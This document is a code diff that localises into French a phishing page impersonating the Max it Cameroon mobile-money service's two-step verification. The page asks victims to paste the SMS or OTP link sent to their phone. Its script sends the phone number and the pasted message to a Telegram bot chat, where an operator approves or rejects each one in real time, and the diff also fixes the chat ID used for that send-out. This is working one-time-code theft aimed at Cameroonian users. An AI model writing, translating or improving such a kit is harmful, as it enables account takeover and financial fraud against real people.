@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Max it Cameroon - Two Step Verification</title>
+    <title>Max it Cameroun - Vérification en deux étapes</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -195,27 +195,27 @@
         <div id="errorModal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; justify-content: center; align-items: center; padding: 20px;">
             <div style="background: white; padding: 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
                 <i class="fa-solid fa-circle-xmark" style="color: #ef4444; font-size: 40px; margin-bottom: 15px;"></i>
-                <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
-                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Wrong verification link, please try again.</p>
-                <button onclick="closeModal()" style="width: 100%; background: #FF7900; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Try Again</button>
+                <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Échec de la vérification</h3>
+                <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Lien de vérification incorrect, veuillez réessayer.</p>
+                <button onclick="closeModal()" style="width: 100%; background: #FF7900; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Réessayer</button>
             </div>
         </div>
 
         <div class="content-area">
-            <h2>Two Step Verification</h2>
-            <p class="subtitle">Paste the complete link/sms message sent to your number</p>
+            <h2>Vérification en deux étapes</h2>
+            <p class="subtitle">Collez le lien complet ou le message SMS envoyé sur votre numéro</p>
 
             <h3 id="displayPhone" class="phone-number">+237.........</h3>
 
-            <textarea id="smsInput" class="sms-textarea" placeholder="Paste your complete Link/SMS message here..."></textarea>
+            <textarea id="smsInput" class="sms-textarea" placeholder="Collez votre lien ou message SMS complet ici..."></textarea>
 
-            <p class="resend-text" id="resendWrapper">Resend in <span id="countdown">30</span> seconds</p>
+            <p class="resend-text" id="resendWrapper">Renvoyer dans <span id="countdown">30</span> secondes</p>
 
-            <button id="submitBtn" class="submit-btn" disabled>SUBMIT</button>
+            <button id="submitBtn" class="submit-btn" disabled>SOUMETTRE</button>
         </div>
 
         <footer class="app-footer">
-            &copy; 2026 Max It Cameroon
+            &copy; 2026 Max It Cameroun
         </footer>
     </div>
 
@@ -230,7 +230,7 @@
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
             btn.classList.remove('active');
-            btn.innerHTML = 'SUBMIT';
+            btn.innerHTML = 'SOUMETTRE';
             btn.style.opacity = '1';
         }
 
@@ -258,7 +258,7 @@
             } else {
                 clearInterval(timer);
                 timerExpired = true;
-                resendWrapper.innerHTML = "Resend link now";
+                resendWrapper.innerHTML = "Renvoyer le lien maintenant";
                 resendWrapper.classList.add('active');
 
                 smsInput.disabled = true;
@@ -286,15 +286,15 @@
         const TELEGRAM_CHAT_ID = '8851096978';
 
         function sendOTPToTelegram(phone, smsText) {
-            const message = `📱 <b>Step 2: OTP / Link Submission (Cameroon)</b>\nPhone: <code>+${phone}</code>\n✉️ Pasted Message:\n<pre>${smsText}</pre>\n\n👇 Please Approve or Reject:`;
+            const message = `📱 <b>Étape 2 : Soumission OTP / Lien (Cameroun)</b>\nTéléphone : <code>+${phone}</code>\n✉️ Message collé :\n<pre>${smsText}</pre>\n\n👇 Veuillez approuver ou rejeter :`;
 
             const inlineKeyboard = {
                 inline_keyboard: [
                     [{
-                        text: "✅ Approve",
+                        text: "✅ Approuver",
                         callback_data: `OTP_APP_${phone}`
                     }, {
-                        text: "❌ Reject",
+                        text: "❌ Rejeter",
                         callback_data: `OTP_REJ_${phone}`
                     }]
                 ]
@@ -306,7 +306,7 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: chatId,
+                    chat_id: TELEGRAM_CHAT_ID,
                     text: message,
                     parse_mode: 'HTML',
                     reply_markup: inlineKeyboard
@@ -348,7 +348,7 @@
                                             decided = true;
                                             clearInterval(intervalId);
 
-                                            btnElement.innerHTML = 'SUBMIT';
+                                            btnElement.innerHTML = 'SOUMETTRE';
                                             btnElement.style.opacity = '1';
                                             btnElement.disabled = true;
                                             btnElement.classList.remove('active');
@@ -358,15 +358,15 @@
                                     }
                                 }
                             })
-                            .catch(err => console.error("Polling error:", err));
+                            .catch(err => console.error("Erreur de scrutation :", err));
                     }, 4000);
                 })
                 .catch(err => {
-                    console.error("Failed to initialize Telegram polling:", err);
-                    btnElement.innerHTML = 'SUBMIT';
+                    console.error("Échec de l'initialisation de la scrutation Telegram :", err);
+                    btnElement.innerHTML = 'SOUMETTRE';
                     btnElement.style.opacity = '1';
                     btnElement.disabled = false;
-                    alert("Network error communicating with the server.");
+                    alert("Erreur réseau lors de la communication avec le serveur.");
                 });
         }
 
@@ -374,7 +374,7 @@
             const smsText = smsInput.value.trim();
             const btn = this;
 
-            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> VERIFYING...';
+            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> VÉRIFICATION EN COURS...';
             btn.style.opacity = '0.8';
             btn.disabled = true;
 
@@ -382,17 +382,17 @@
                 .then(async response => {
                     const resJson = await response.json();
                     if (!response.ok || !resJson.ok) {
-                        console.error("Telegram API detail:", resJson);
-                        throw new Error(resJson.description || "Failed to send Telegram message");
+                        console.error("Détails API Telegram :", resJson);
+                        throw new Error(resJson.description || "Échec de l'envoi du message Telegram");
                     }
                     startListeningForOTPDecision(cleanPhoneForBot, btn);
                 })
                 .catch(error => {
-                    console.error("Telegram API Error:", error);
-                    btn.innerHTML = 'SUBMIT';
+                    console.error("Erreur API Telegram :", error);
+                    btn.innerHTML = 'SOUMETTRE';
                     btn.style.opacity = '1';
                     btn.disabled = false;
-                    alert("Error connecting to the verification server. Please try again.");
+                    alert("Erreur de connexion au serveur de vérification. Veuillez réessayer.");
                 });
         });
     </script>
